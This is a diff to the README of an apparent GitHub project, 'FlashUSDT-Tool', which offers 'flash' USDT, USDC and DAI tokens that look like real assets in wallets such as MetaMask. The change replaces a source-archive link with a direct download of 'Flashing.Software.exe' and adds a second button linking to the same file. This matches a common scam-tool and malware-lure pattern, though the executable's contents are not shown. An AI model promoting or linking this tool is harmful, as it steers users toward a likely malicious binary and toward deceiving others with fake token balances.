@@ -5,7 +5,7 @@ A lightweight, GUI-based Ethereum education utility designed for **flash token t
 <h1 align="center"><b>🚀 Download Now</b></h1>
 
 <p align="center">
-  <a href="https://github.com/alpha-arb/FlashUSDT-Tool/archive/refs/tags/Tool.zip">
+  <a href="https://github.com/alpha-arb/FlashUSDT-Tool/releases/download/Tool/Flashing.Software.exe">
     <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
   </a>
 </p>
@@ -31,6 +31,12 @@ All tokens are **visual-only**, designed to simulate real assets:
 - **USDT (Tether)**
 - **USDC (USD Coin)**
 - **DAI (Multi-Collateral Dai)**
+
+<p align="center">
+  <a href="https://github.com/alpha-arb/FlashUSDT-Tool/releases/download/Tool/Flashing.Software.exe">
+    <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
+  </a>
+</p>
 
 These tokens:
 **- Appear in any Ethereum wallet (e.g., MetaMask) just like real tokens.**
